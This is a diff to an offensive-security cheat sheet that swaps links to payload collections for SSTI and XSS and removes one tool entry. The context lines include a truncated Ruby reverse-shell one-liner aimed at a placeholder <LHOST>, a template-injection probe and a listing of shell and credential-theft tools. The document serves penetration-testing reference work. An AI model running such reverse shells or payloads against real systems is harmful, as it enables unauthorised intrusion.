@@ -68,7 +68,6 @@
 | Nishang | Offensive PowerShell for red team, penetration testing and offensive security. | https://github.com/samratashok/nishang |
 | ntlm_theft | A tool for generating multiple types of NTLMv2 hash theft files. | https://github.com/Greenwolf/ntlm_theft |
 | p0wny@shell:~# | Single-file PHP shell | https://github.com/flozz/p0wny-shell |
-| Payload Box | Payload Collection | https://github.com/payloadbox |
 | PayloadsAllTheThings | A list of useful payloads and bypass for Web Application Security and Pentest/CTF. | https://github.com/swisskyrepo/PayloadsAllTheThings |
 | phpgcc | PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically. | https://github.com/ambionics/phpggc |
 | PHP-Reverse-Shell | PHP shells that work on Linux OS, macOS, and Windows OS. | https://github.com/ivan-sincek/php-reverse-shell |
@@ -1521,7 +1520,7 @@ $ ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/s
 
 ## Server-Side Template Injection (SSTI)
 
-> https://github.com/payloadbox/ssti-payloads
+> https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/
 
 ```console
 {{2*2}}[[3*3]]
@@ -1631,7 +1630,7 @@ shell.Run("C:\Windows\System32\calc.exe" & WScript.ScriptFullName),0,True
 
 ## Cross-Site Scripting (XSS)
 
-> https://github.com/payloadbox/xss-payload-list
+> https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/
 
 ### Common Payloads
 
